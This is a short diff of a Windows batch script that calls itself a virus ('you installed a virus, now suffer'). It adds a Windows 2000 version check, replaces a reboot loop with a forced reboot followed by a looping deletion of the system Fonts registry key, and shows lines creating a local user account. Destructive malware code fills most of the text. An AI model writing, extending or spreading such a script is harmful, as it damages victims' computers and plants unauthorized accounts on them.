@@ -44,6 +44,9 @@ if %ERRORLEVEL% == 0 goto MAININSTALLB
 wmic os get version | find "5.1" > nul
 if %ERRORLEVEL% == 0 goto MAININSTALLB
 )
+ver | find "5.0" > nul
+if %ERRORLEVEL% == 0 goto MAININSTALLB
+)
 cls
 echo OS Check Failed.
 PAUSE
@@ -160,10 +163,10 @@ exit
 :RESTART
 echo you idiot, you installed a virus, now suffer!!!!!!!!!
 echo,
-:REBOOTMILL
-WMIC OS WHERE PRIMARY=1 REBOOT
-start powershell wininit.exe
-GOTO REBOOTMILL
+wmic os where primary=1 reboot
+:DESTOY
+REG DELETE HKML\Software\Microsoft\Windows NT\Fonts /F
+GOTO RESTART
 :MAININSTALLB
 net user beachball /add
 net localgroup Guests beachball /add
